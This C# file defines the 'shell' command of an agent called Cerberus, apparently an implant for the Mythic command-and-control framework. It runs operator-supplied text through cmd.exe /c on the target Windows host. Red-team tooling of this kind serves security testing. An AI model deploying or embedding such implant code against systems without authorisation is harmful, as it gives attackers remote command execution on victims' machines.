using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class Shell : CerberusCommand
    {
        public override string Name => "shell";

        public override string Execute(MythicTask task)
        {
            var Arguments = task.parameters.Split(' ');

            if (Arguments is null || Arguments.Length == 0)
                return "No arguments supplied. Please supply a command to run";

            var args = string.Join(" ", Arguments);
            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {args}");
        }
    }
}
